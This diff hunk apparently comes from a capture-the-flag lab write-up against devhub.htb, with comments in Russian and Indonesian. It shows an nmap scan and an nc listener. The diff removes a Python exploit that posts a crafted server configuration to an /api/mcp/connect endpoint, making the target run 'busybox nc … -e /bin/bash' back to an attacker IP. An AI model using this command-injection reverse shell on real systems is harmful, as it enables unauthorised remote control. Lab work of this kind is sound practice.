@@ -63,28 +63,6 @@ nmap -p 6274 -sV devhub.htb
 # Слушатель
 nc -lvnp 4444
 
-# exploit.py
-# SKRIP/exploit.py
-import requests
-
-target = "http://devhub.htb:6274"
-ip     = "10.10.14.215"   # Ganti dengan IP attacker
-port   = "4444"
-
-url  = f'{target}/api/mcp/connect'
-data = {
-    "serverConfig": {
-        "command": "busybox",
-        "args": ["nc", ip, port, "-e", "/bin/bash"],
-        "env": {}
-    },
-    "serverId": "213j1l3jkljkl3j"
-}
-
-response = requests.post(url, json=data, verify=False)
-print(response.status_code)
-print(response.text)
-```
 
 # Отправка полезной нагрузки
 python3 exploit.py
